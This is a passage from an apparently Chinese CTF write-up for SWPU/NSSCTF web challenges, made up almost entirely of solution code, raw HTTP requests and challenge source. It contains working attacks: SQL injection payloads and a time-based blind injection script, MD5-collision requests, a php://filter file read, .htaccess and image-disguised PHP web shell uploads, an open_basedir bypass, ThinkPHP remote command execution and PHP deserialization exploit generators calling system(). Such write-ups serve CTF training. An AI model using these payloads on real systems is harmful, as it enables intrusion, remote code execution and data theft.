        rnds = ''.join(random.choice(CHARS) for _ in range(size))
        md5 = hashlib.md5(rnds)

        if md5.hexdigest()[start: start+str_len] == substr:
            print rnds
            stop_event.set()

if __name__ == '__main__':
    substr = sys.argv[1].strip()

    start_pos = int(sys.argv[2]) if len(sys.argv) > 1 else 0

    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                         stop_event, str_len, start_pos))
                 for i in range(cpus)]

    for p in processes:
        p.start()

    for p in processes:
        p.join()
```



```
php -r 'var_dump(intval(0.58 * 100));'
int(57)
```



```
POST /?jiangnaij=36805032837458517684&csc8=57 HTTP/1.1
Host: 175.24.172.136:30007
Content-Length: 422
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://175.24.172.136:30007/?jiangnaij=36805032837458517684&csc8=57
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

pysnow[]=Tao&M1sery[]=oo&s0rry=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&DSTBP=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```



```
flag2:
17fa-4aec-
```



```
<?php
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
    $host=$x['host'];
    if((substr($host)<=7)){
        $swpu=curl_init($url);
        curl_setopt($swpu, CURLOPT_HEADER, 0);
        curl_setopt($swpu, CURLOPT_RETURNTRANSFER, 1);
        $result=curl_exec($swpu);
        curl_close($swpu);
        echo ($result);
    }
    else{
        die('hacker！');
    }
}
else{
    die('怎么做？');
}
?>
```



```
?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),user(),CHAR(126)))%23
```



```
/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Group_Concat(database_name)/**/From/**/mysql.innodb_table_stats),CHAR(126)))%23
# XPATH syntax error: '~mysql,test_db,test_db~'
```



```
/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Group_Concat(database_name)/**/From/**/mysql.innodb_table_stats),CHAR(126)))%23
# '~gtid_slave_pos,test_tb,users~'
```



```
/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/`2`/**/From(Select/**/1,2/**/Union/**/Select/**/*/**/From/**/test_tb)a/**/Limit/**/1,1),CHAR(126)))%23  
# XPATH syntax error: '~swpu{aba16000-448a-4bfb-874f-7d'

/?wllm='/**/And/**/extractvalue(rand(),Concat(CHAR(126),(Select/**/Reverse(`2`)/**/From(Select/**/1,2/**/Union/**/Select/**/*/**/From/**/test_tb)a/**/Limit/**/1,1),CHAR(126)))%23

XPATH syntax error: '~}69e2a4f858d7-f478-bfb4-a844-00'
```



```
$wllm = waf($_GET["wllm"]);
include("$wllm");
```



```
import requests
import time
from bs4 import BeautifulSoup

url = 'http://175.24.172.136:30041/'
s = requests.session()
for i in range(200):
 print(i)
 res = s.get(url)
 soup = BeautifulSoup(res.text,'html.parser')
 get_express = soup.find_all('a')[2].text
 get_express = get_express.replace('=','')
 exres = eval(get_express)
 time.sleep(1)
 data = {
  'result':exres,
  'submit': '提交'}
 r = s.post(url,data=data)
 print(r.text)
 if 'swpu{' in r.text:
  print(r.text)
  break
```



```
<?php
include_once "flag.php";
error_reporting(0);
function waf($file): bool
{
    if (preg_match('/http|info|https|utf|zlib|data|rot13|input|base64|log|sess/s', $file)) {
        return false;
    } else return true;
}

if (isset($_GET['key']) && waf(strtolower($_GET['key']))) {
    $key = call_user_func($_GET['key']);
    if ($key == "swpu") {
        $file = $_POST['file'];
        if (waf($file)) {
            include_once $file;
        } else {
            echo "Get Out Hacker!";
        }
    } else {
        echo "Wrong key!";
    }
} else {
    highlight_file(__FILE__);
}
```



```
file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```



```
php_value auto_append_file "php://filter/convert.base64-decode/resource=Tao.php"
```



```
# Tao.php 内容如下：
PD9waHAgZWNobyAiVGFvIjtldmFsKCRfUkVRVUVTVFswXSk7Pz4=
# 解码为：
# <?php echo "Tao";eval($_REQUEST[0]);?>
```



```
?0=var_dump(new DirectoryIterator("glob:///f*"));
# /fllllllllllll4g
?0=mkdir('Tao');chdir('Tao');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo (file_get_contents('fllllllllllll4g'));
```



```
import requests
import time
# swpu_wllm_boolsql
# gtid_slave_pos,flag,username
#id,username,password,id,flag

def inject(url):
 name = ''

 for i in range(1,100000):
  low = 32
  high = 128
  mid = (low + high) // 2
  while low < high:
   #payload = '0"/**/or/**/iF(Ascii(Substr((Select/**/Group_concat(table_name)/**/From/**/mysql.innodb_table_stats),%d,1))>%d,Sleep(1),0)#' % (i,mid)
   #print(payload)
   #payload = '0"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(column_name)/**/From/**/information_schema.columns/**/Where/**/table_schema=0x737770755F776C6C6D5F626F6F6C73716C),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
   payload = '0"/**/or/**/If(Ascii(Substr((Select/**/Group_concat(flag)/**/From/**/username),%d,1))>%d,Sleep(1),0)#'  % (i,mid)
   print(payload)
   params = {'username':payload}
   start_time = time.time() # 注入前的系统时间
   r = requests.post(url,data = params)
   end_time = time.time()  #  注入后的时间
   if end_time - start_time > 1:
    low = mid + 1
   else:
    high = mid
   mid = (low + high) // 2

  if mid == 32:
   break
  name = name + chr(mid) 
  print(name)

inject("http://175.24.172.136:30063/")
```



```
<?php
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
highlight_file(__FILE__);
include('flag.php');
if (isset($_GET['num'])) {
    $num = $_GET['num'];
    if ($num != '12345') {
        if (intval($num) == '12345') {
            echo $FLAG;
        }
    } else {
        echo "这为何相等又不相等";
    }
}
```



```
<!--
$x= $GET['x'];
$y = $_GET['y'];
if($x != $y && md5($x) == md5($y)){
    ;
-->
```



```
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['wqh']!==$_POST['dsy']&&md5($_POST['wqh'])===md5($_POST['dsy'])){
    echo $FLAG;
}
```



```
POST /f1na11y.php HTTP/1.1
Host: 1.14.71.254:28607
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://1.14.71.254:28607/f1na11y.php
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: td_cookie=955577959
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 393

wqh=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&dsy=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```



```
<?php
error_reporting(0);

highlight_file(__FILE__);

if (isset($_GET['get'])){
    $get=$_GET['get'];
    if(!strstr($get," ")){
        $get = str_ireplace("flag", " ", $get);
        
        if (strlen($get)>18){
            die("This is too long.");
            }
            
            else{
                eval($get);
          } 
    }else {
        die("nonono"); 
    }

}
```



```
AddType application/x-httpd-php .jpg
```



```
POST / HTTP/1.1
Host: 1.14.71.254:28890
Content-Length: 322
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Origin: http://1.14.71.254:28890
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoeioPhnZHf89aU1I
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://1.14.71.254:28890/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Connection: close

------WebKitFormBoundaryoeioPhnZHf89aU1I
Content-Disposition: form-data; name="uploaded"; filename=".htaccess"
Content-Type: image/jpeg

AddType application/x-httpd-php .jpg
------WebKitFormBoundaryoeioPhnZHf89aU1I
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryoeioPhnZHf89aU1I--
```



```
POST / HTTP/1.1
Host: 1.14.71.254:28890
Content-Length: 335
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://1.14.71.254:28890
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqQFrjPfCB9vBZcue
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://1.14.71.254:28890/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: td_cookie=957449640; PHPSESSID=7ad99d11abbb350e60d1e78984493ab0
Connection: close

------WebKitFormBoundaryqQFrjPfCB9vBZcue
Content-Disposition: form-data; name="uploaded"; filename="Tao.jpg"
Content-Type: image/jpeg

<script language="php">eval($_REQUEST[0]);</script>
------WebKitFormBoundaryqQFrjPfCB9vBZcue
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryqQFrjPfCB9vBZcue--
```



```
NSSCTF{TnNTY1RmLnBocA==} -> NsScTf.php
```



```
<?php
error_reporting(0);
//hint: 与get相似的另一种请求协议是什么呢
include("flag.php");
class nss{
    static function ctf(){
        include("./hint2.php");
    }
}
if(isset($_GET['p'])){
    if (preg_match("/n|c/m",$_GET['p'], $matches))
        die("no");
    call_user_func($_GET['p']);
}else{
    highlight_file(__FILE__);
}
```



```
/NSS/index.php/?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find+/+-type+f+-name+'flag'+2>/dev/null

/NSS/index.php/?s=index/thinkapp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat+/nss/ctf/flag/flag
```



```
nss=-41'/**/Ununionion/**/SelEct/**/1,2,group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb%23
```



```
<?php
error_reporting(0);
class dxg
{
   function fmm()
   {
      return "nonono";
   }
}

class lt
{
   public $impo='hi';
   public $md51='weclome';
   public $md52='to NSS';
   function __construct()
   {
      $this->impo = new dxg;
   }
   function __wakeup()
   {
      $this->impo = new dxg;
      return $this->impo->fmm();
   }

   function __toString()
   {
      if (isset($this->impo) && md5($this->md51) == md5($this->md52) && $this->md51 != $this->md52)
         return $this->impo->fmm();
   }
   function __destruct()
   {
      echo $this;
   }
}

class fin
{
   public $a;
   public $url = 'https://www.ctfer.vip';
   public $title;
   function fmm()
   {
      $b = $this->a;
      $b($this->title);
   }
}

if (isset($_GET['NSS'])) {
   $Data = unserialize($_GET['NSS']);
} else {
   highlight_file(__file__);
}
```



```
<?php
error_reporting(0);
class dxg
{
   function fmm()
   {
      return "nonono";
   }
}

class fin
{
   public $a = 'system';
   public $url = 'Tao';
   public $title = 'cat /*';
//    function fmm()
//    {
//       $b = $this->a;
//       $b($this->title);
//    }
}

class lt
{
   public $impo='hi';
   public $md51='aabg7XSs';
   public $md52='s878926199a';
   function __construct()
   {
      $this->impo = new fin();
   }
}

$a = serialize(new lt());
$a = str_replace('"lt":3:','"lt":4:',$a);
echo urlencode($a);
```



```
<?php
 
class lyh{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;
     
     function  __destruct()
     {
        $a = $this->lt;

        $a($this->lly);
     }
    
    
}
unserialize($_POST['nss']);
highlight_file(__FILE__);
 
 
?>
```



```
#exp
<?php
 
class lyh{
    public $url = 'Tao';
    public $lt = 'system';
    public $lly = 'cat /f*';
     
     function  __destruct()
     {
        $a = $this->lt;

        #$a($this->lly);
     }
    
    
}
echo urlencode(serialize(new lyh()));
 
?>
```



```
GET / HTTP/1.1
Host: 1.14.71.254:28860
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Referer: http://1.14.71.254:28860/home
X-FORWARDED-FOR:127.0.0.1
Connection: close
```



```
document.getElementsByTagName("button")[0].addEventListener("click", ()=>{
    flag="33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15"
    if (btoa(flag.value) == 'dGFwY29kZQ==') {
        alert("you got hint!!!");
    } else {
        alert("fuck off !!");
    }    
})
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666576538.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1666576539.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/10-1666576540.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/8-1666576540.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/4-1666576540.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666576541.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/3-1666576542.png)